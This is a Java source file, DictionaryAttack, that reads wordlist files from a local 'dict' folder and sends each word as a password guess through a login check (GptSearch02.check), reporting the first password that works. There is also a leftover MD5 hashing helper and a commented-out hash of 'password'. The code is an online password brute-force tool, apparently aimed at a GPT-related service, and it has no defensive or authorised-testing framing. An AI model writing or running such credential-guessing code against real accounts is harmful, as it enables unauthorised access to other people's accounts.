package com.shungen.gpt;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class DictionaryAttack {

    public static void main(String[] args) {
//        String passwordHash = "5f4dcc3b5aa765d61d8327deb882cf99"; // MD5 hash of "password"
        String fireDir = "pro02-okhttptest\\src\\main\\resources\\dict";
        File file = new File(fireDir);
        File[] files = file.listFiles();
        String dictionaryFile = "";
        for(int i = 0;i < files.length;i++){
            System.out.println(files[i].getAbsolutePath());
            dictionaryFile = files[i].getAbsolutePath();
            List<String> dictionary = loadDictionary(dictionaryFile);
            for (String word : dictionary) {
//                String hash = md5(word);
                boolean flag = GptSearch02.check(word);
                System.out.println("send login request and check pwd:" + word + "(" + flag + ")");
                if (flag) {
                    System.out.println("Password found: " + word);
                    return;
                }
            }
            System.out.println("===========☆==============="  + files[i].getName() + "not find!");
        }

    }

    private static List<String> loadDictionary(String dictionaryFile) {
        List<String> dictionary = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(new File(dictionaryFile)))) {
            String line;
            while ((line = reader.readLine()) != null) {
                dictionary.add(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return dictionary;
    }

    private static String md5(String input) {
        try {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
            byte[] array = md.digest(input.getBytes());
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < array.length; ++i) {
                sb.append(Integer.toHexString((array[i] & 0xFF) | 0x100).substring(1,3));
            }
            return sb.toString();
        } catch (java.security.NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return null;
    }
}